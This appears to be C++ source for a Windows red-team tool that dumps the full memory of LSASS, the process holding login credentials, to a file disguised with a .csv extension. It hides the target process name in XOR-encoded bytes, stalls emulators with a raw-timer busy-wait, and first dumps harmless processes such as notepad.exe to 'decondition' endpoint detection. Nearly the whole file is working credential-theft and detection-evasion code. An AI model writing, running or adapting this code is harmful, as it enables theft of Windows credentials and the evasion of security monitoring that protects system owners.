#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <chrono>
#include <iostream>
#include <vector>

#include "processcache.h"

#pragma comment(lib, "dbghelp.lib")



// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

void sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}


bool dump_process(DWORD pid) {
	std::string dumpFileName = std::to_string(pid) + ".csv";

    HANDLE hFile = CreateFileA(dumpFileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "  Failed to open dump file: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "  Failed to open process: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return false;
    }

    if (!MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        std::cerr << "  Failed to create dump: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "  Dump created successfully\n";

    CloseHandle(hFile);
	CloseHandle(hProcess);
}


void deconditioning(unsigned int deconDumps) {
    std::vector<std::wstring> procsDump = {
        //L"ctfmon.exe", L"explorer.exe", L"ShellHost.exe", L"audiodg.exe"
        L"notepad.exe", L"cmd.exe", L"StartMenuExperienceHost.exe"
    };

    for(int i=0; i<deconDumps; i++) {
        DWORD pid = ProcessCache::GetPid(procsDump[i % procsDump.size()]);
		std::wcout << L"Deconditioning dump for " << std::wstring(procsDump[i % procsDump.size()]) << L" with pid " << pid << std::endl;
        dump_process(pid);
	}
}


void dump_ls4ss() {
    // ls4ss.exe
    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);

    DWORD lsa4sPid = ProcessCache::GetPid(procW);
    if (lsa4sPid != 0) {
		std::cout << "Dumping ls4ss.exe with pid " << lsa4sPid << std::endl;
        if (dump_process(lsa4sPid)) {
            std::cout << "  ls4ss.exe dumped successfully with pid " << lsa4sPid << std::endl;
        }
        else {
            std::cerr << "  Failed to dump ls4ss.exe with pid " << lsa4sPid << std::endl;
        }
    }
    else {
        std::cerr << "  ls4ss.exe not found\n";
    }
}


int main(int argc, char* argv[]) {
    std::cout << "Start\n";
    antiemulation();

    deconditioning(10);
    
    if (argc > 1 && argv[1][0] == '1') {
		std::cout << "Dumping target\n";
        dump_ls4ss();
    }
    else {
        std::cout << "Didnt dump target\n";
    }

    std::cout << "End\n";
	return 0;
}
